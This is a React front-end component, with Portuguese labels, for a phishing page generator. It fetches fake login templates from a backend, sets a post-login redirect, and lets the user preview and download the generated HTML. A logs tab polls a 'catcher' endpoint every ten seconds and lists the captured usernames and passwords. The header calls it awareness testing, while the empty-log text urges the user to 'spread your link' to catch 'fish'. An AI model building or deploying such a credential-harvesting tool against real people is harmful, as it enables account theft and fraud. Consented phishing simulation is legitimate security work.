import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { Mail, ShieldAlert, ExternalLink, Copy, Download, Eye, Terminal, CheckCircle, Trash2, Database } from 'lucide-react';
import { useAuth } from '../context/AuthContext';
import { API_URL } from '../config';
import './PhishingGenerator.css';

const PhishingGenerator = () => {
  const { token } = useAuth();
  const [templates, setTemplates] = useState([]);
  const [selectedTemplate, setSelectedTemplate] = useState('');
  const [redirectUrl, setRedirectUrl] = useState('https://google.com');
  const [generatedHtml, setGeneratedHtml] = useState('');
  const [capturedData, setCapturedData] = useState([]);
  const [loading, setLoading] = useState(false);
  const [activeTab, setActiveTab] = useState('generator'); // 'generator' or 'logs'

  useEffect(() => {
    loadTemplates();
    loadCapturedData();
    const interval = setInterval(loadCapturedData, 10000); // Poll logs every 10s
    return () => clearInterval(interval);
  }, []);

  const loadTemplates = async () => {
    try {
      const resp = await axios.get(`${API_URL}/api/tools/phishing/templates`);
      setTemplates(resp.data);
      if (resp.data.length > 0) setSelectedTemplate(resp.data[0].id);
    } catch (err) {
      console.error("Erro ao carregar templates", err);
    }
  };

  const loadCapturedData = async () => {
    try {
      const resp = await axios.get(`${API_URL}/api/tools/catcher/credentials`);
      if (Array.isArray(resp.data)) {
        setCapturedData(resp.data.slice().reverse());
      }
    } catch (err) {
      console.error("Erro ao carregar logs", err);
    }
  };

  const handleGenerate = async () => {
    setLoading(true);
    try {
      const resp = await axios.post(`${API_URL}/api/tools/phishing/generate`, {
        template: selectedTemplate,
        redirect_url: redirectUrl
      });
      setGeneratedHtml(resp.data.html);
    } catch (err) {
      alert("Erro ao gerar phishing");
    } finally {
      setLoading(false);
    }
  };

  const downloadHtml = () => {
    const blob = new Blob([generatedHtml], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `login_${selectedTemplate}.html`;
    a.click();
  };

  return (
    <div className="phishing-page">
      <header className="page-header">
        <h1><ShieldAlert size={32} /> PHISHING GENERATOR</h1>
        <p>Criação de páginas de captura para testes de conscientização</p>
      </header>

      <div className="tabs-container">
        <button 
          className={`tab-btn ${activeTab === 'generator' ? 'active' : ''}`}
          onClick={() => setActiveTab('generator')}
        >
          <Terminal size={18} /> GERADOR
        </button>
        <button 
          className={`tab-btn ${activeTab === 'logs' ? 'active' : ''}`}
          onClick={() => setActiveTab('logs')}
        >
          <Database size={18} /> LOGS DE CAPTURA ({capturedData.length})
        </button>
      </div>

      {activeTab === 'generator' ? (
        <div className="generator-grid">
          <div className="config-card">
            <h2>⚙️ CONFIGURAÇÃO</h2>
            
            <div className="form-group">
              <label>Selecione o Template</label>
              <div className="template-grid">
                {templates.map(t => (
                  <div 
                    key={t.id} 
                    className={`template-item ${selectedTemplate === t.id ? 'active' : ''}`}
                    onClick={() => setSelectedTemplate(t.id)}
                  >
                    <Mail size={24} />
                    <span>{t.name}</span>
                  </div>
                ))}
              </div>
            </div>

            <div className="form-group">
              <label>URL de Redirecionamento (Pós-login)</label>
              <input 
                type="text" 
                value={redirectUrl} 
                onChange={(e) => setRedirectUrl(e.target.value)}
                placeholder="https://google.com"
              />
            </div>

            <button className="btn-primary" onClick={handleGenerate} disabled={loading}>
              {loading ? 'GERANDO...' : 'GERAR TEMPLATE'}
            </button>

            {generatedHtml && (
              <div className="actions-card">
                <h3>PÁGINA GERADA!</h3>
                <div className="action-buttons">
                  <button onClick={() => {
                    const win = window.open('', '_blank');
                    if (win) {
                      win.document.open();
                      win.document.write(generatedHtml);
                      win.document.close();
                    } else {
                      alert("Por favor, desabilite o bloqueador de pop-ups para ver o preview.");
                    }
                  }} className="btn-secondary">
                    <Eye size={18} /> PREVIEW
                  </button>
                  <button onClick={downloadHtml} className="btn-success">
                    <Download size={18} /> DOWNLOAD .HTML
                  </button>
                </div>
              </div>
            )}
          </div>

          <div className="preview-card">
            <h2>🔍 CÓDIGO FONTE</h2>
            <div className="code-container">
              <pre><code>{generatedHtml || 'O código aparecerá aqui...'}</code></pre>
            </div>
          </div>
        </div>
      ) : (
        <div className="logs-container">
          <h2>🎣 CAPTURAS RECENTES</h2>
          <div className="logs-table-wrapper">
            <table className="logs-table">
              <thead>
                <tr>
                  <th>Data/Hora</th>
                  <th>Template</th>
                  <th>Credenciais</th>
                  <th>Dispositivo</th>
                </tr>
              </thead>
              <tbody>
                {capturedData.length > 0 ? capturedData.map((log, i) => (
                  <tr key={i}>
                    <td>{new Date(log.timestamp).toLocaleString()}</td>
                    <td><span className="badge-template">{log.template}</span></td>
                    <td className="creds-cell">
                      {log.data && Object.entries(log.data).map(([k, v]) => (
                        <div key={k}><strong>{k}:</strong> {v}</div>
                      ))}
                    </td>
                    <td className="metadata-cell">
                      {log.metadata?.platform || 'Unknown'}
                    </td>
                  </tr>
                )) : (
                  <tr>
                    <td colSpan="4" style={{textAlign: 'center', padding: '3rem'}}>
                      Nenhum "peixe" fisgado ainda. Divulgue seu link!
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      )}
    </div>
  );
};

export default PhishingGenerator;
